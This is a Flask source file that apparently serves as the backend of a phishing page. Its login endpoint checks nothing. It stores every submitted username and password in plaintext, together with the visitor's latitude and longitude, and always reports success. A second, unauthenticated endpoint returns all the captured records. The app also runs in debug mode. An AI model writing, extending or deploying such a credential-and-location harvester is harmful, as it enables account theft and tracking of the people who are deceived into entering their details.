from flask import Flask, render_template, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)
DB_FILE = 'database.json'

def read_db():
    if not os.path.exists(DB_FILE):
        return []
    with open(DB_FILE, 'r', encoding='utf-8') as f:
        try:
            return json.load(f)
        except:
            return []

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    lat = data.get('latitude', 'غير متوفر')
    lon = data.get('longitude', 'غير متوفر')
    
    if not username or not password:
        return jsonify({"error": "Missing data"}), 400

    current_db = read_db()
    new_entry = {
        "username": username,
        "password": password,
        "latitude": lat,
        "longitude": lon,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    current_db.append(new_entry)
    save_db(current_db)
    
    return jsonify({"status": "success"})

@app.route('/api/get_data', methods=['GET'])
def get_data():
    return jsonify(read_db())

if __name__ == '__main__':
    app.run(debug=True)
